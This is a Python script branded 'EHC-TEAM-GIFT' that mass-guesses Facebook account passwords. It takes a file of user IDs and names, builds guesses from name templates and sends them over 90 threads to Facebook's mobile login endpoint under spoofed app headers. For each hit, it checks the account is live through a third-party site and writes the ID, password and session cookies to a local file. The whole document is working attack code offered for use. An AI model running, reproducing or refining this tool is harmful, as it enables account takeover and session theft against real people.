import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests,rich
except:
    os.system("pip install requests rich -y")
    import requests,rich

from rich import print
from rich.panel import Panel

li="[b navy_blue]—"

cox=str(f"{li}"*37)

tlg="""[b]
[b chartreuse1]╭─────────────────╮
[d white]│[/d white] [green]Tool  [red]‣[green] EHC-TEAM-GIFT [d white] │[/d white][b blue]┏┓┳┳┏┓┳┳┳┳┓┳
[d white]│[/d white] [green]Owner[red] ‣[green] TE   [d white]   │[/d white][b blue]┗┓┃┃┏┛┃┃┃┃┃┃
[d white]│[/d white] [r b violet]Version 1.1[/r b violet]  [d white]   │[/d white][b blue]┗┛┗┛┗┛┗┛┛ ┗┻
[b chartreuse1]╰─────────────────╯"""
def logox():
    os.system('clear')
    #print(Panel.fit(logo),lg)
    print(tlg)

def main():
    logox()
    
    print(cox)
    print(" [b bright_green] [A] FILE CLONE [b red] [Lock Remove]")
    print(cox)
    want=input("  [‣/] INPUT > ")
    if want in ["A","a","1","01"]:
        file_iclone()
    elif want in ["B","b","2","02"]:
        print(cox)
        print(" [b bright_green] [[red]‣[b bright_green]] Thanks For using My tool")
        print(cox)
        sys.exit()
    else:
        print(cox)
        print("  [b bright_green] [[red]‣[b bright_green]] Input right option")
        print(cox)
        time.sleep(3)
        main()

def file_iclone():
    print(cox)
    fl=input("  [‣/] File Path: ")
    print(cox)
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        print(" [b bright_green] [[red]‣[b bright_green]] File Does not found")
        print(cox)
        sys.exit()
    auto_pass(fileeee)



def auto_pass(fileeee):
    tl=str(len(fileeee))
    pwx=[]
    logox()
    print(cox)
    print(" [b bright_green] [[red]‣[b bright_green]] Example 10, 15, 20")
    print(cox)
    limi=input("  [‣] Add Password Limit ‣/ ")
    print(cox)
    for i in range(int(limi)):
        print(" [b bright_green] [[red]‣[b bright_green]] Example first123, first last")
        add=input(f"  [{i+1}] Add Password ‣ ")
        print(cox)
        if add not in pwx:
            pwx.append(add)
    print(cox)
    print(" [b] Method  ‣ (A|B|C|D)")
    mathid=input("Choose ‣ ")
    
    logox()
    print(cox)
    print(f" [b bright_green] [[red]‣[b bright_green]] Total id {tl} <> Method {mathid.upper()} ")
    print(cox)
    print(" [b bright_green] [[red]‣[b bright_green]] Id Save: /sdcard/elite_ok.txt")
    print(cox)
    with ThreadPool (max_workers=90) as feel:
        for data in fileeee:
            uid=data.split("|")[0]
            nam=data.split("|")[1]
            if mathid in ["A","a","1"]:
                feel.submit(mathodA,uid,pwx,nam)
            elif mathid in ["B","b","2"]:
                feel.submit(mathodB,uid,pwx,nam)
            elif mathid in ["C","c","3"]:
                feel.submit(mathodC,uid,pwx,nam)
            else:
                feel.submit(mathodD,uid,pwx,nam)
loop=0
oks=[]
cps=[]


def live_ck(uid):
    Heron=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
    data=str(Heron)
    if "live" == data.lower():
        return "Alive"
    else:
        return "death"




def mathodA(uid,pwx,nam):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[EHC-TEAM-GIFT] {loop}|0K‣{str(len(oks))}|CP‣{str(len(cps))}\r");sys.stdout.flush()
    try:
        fn = nam.split(' ')[0]
        try:
            ln = nam.split(' ')[1]
        except:
            ln = fn
        for pxx in pwx:
            ps=pxx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nam).replace('name',nam.lower())
            ua="[FBAN/FB4A;FBAV/"+str(random.choice(range(130,320)))+".0.0.26."+str(random.choice(range(130,320)))+";FBBV/"+str(random.choice(range(130700000,999999999)))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers).json()
            #print(q)
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
                
                break
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
            elif "www.facebook.com" in q:
                #print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

def mathodB(uid,pwx,nam):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[EHC-TEAM-GIFT] {loop}|0K‣{str(len(oks))}|CP‣{str(len(cps))}\r");sys.stdout.flush()
    try:
        fn = nam.split(' ')[0]
        try:
            ln = nam.split(' ')[1]
        except:
            ln = fn
        for pxx in pwx:
            ps=pxx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nam).replace('name',nam.lower())
            ua="FBAV/"+str(random.choice(range(130,320)))+".0.0.29."+str(random.choice(range(130,320)))+";FBPN/com.facebook.orca;FBLC/th_TH;FBBV/"+str(random.choice(range(100000000,444444444)))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers).json()
            #print(q)
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
                
                break
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
            elif "www.facebook.com" in q:
                #print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

def mathodC(uid,pwx,nam):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[EHC-TEAM-GIFT] {loop}|0K‣{str(len(oks))}|CP‣{str(len(cps))}\r");sys.stdout.flush()
    try:
        fn = nam.split(' ')[0]
        try:
            ln = nam.split(' ')[1]
        except:
            ln = fn
        for pxx in pwx:
            ps=pxx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nam).replace('name',nam.lower())
            ua="[FBAN/Orca-Android;FBAV/"+str(random.choice(range(150,300)))+".0.0.17."+str(random.choice(range(130,300)))+";FBPN/com.facebook.orca;FBLC/th_TH;FBBV/"+str(random.choice(range(13000000,329999990)))+";FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
            data = {
            "adid": str(uuid.uuid4()), 
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers).json()
            #print(q)
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
                
                break
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
            elif "www.facebook.com" in q:
                #print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

def mathodD(uid,pwx,nam):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[EHC-TEAM-GIFT] {loop}|0K‣{str(len(oks))}|CP‣{str(len(cps))}\r");sys.stdout.flush()
    try:
        fn = nam.split(' ')[0]
        try:
            ln = nam.split(' ')[1]
        except:
            ln = fn
        for pxx in pwx:
            ps=pxx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nam).replace('name',nam.lower())
            ua="[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.50."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/es_MX;FBBV/"+str(random.choice(range(156666660,999999300)))+";FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers).json()
            #print(q)
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
                
                break
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    oks.append(cid)
                    print(f"\r\r[r b white][EHC-TEAM-GIFT][/r b white] [chartreuse1]{cid}[/chartreuse1] [red1]‣[/red1] {ps}   \n[b][OK[red]+[/red]{str(len(oks))}][/b][sea_green2]{coki} \n[b navy_blue]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    open("/sdcard/elite_ok.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    break
                else:pass
            elif "www.facebook.com" in q:
                #print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)




main()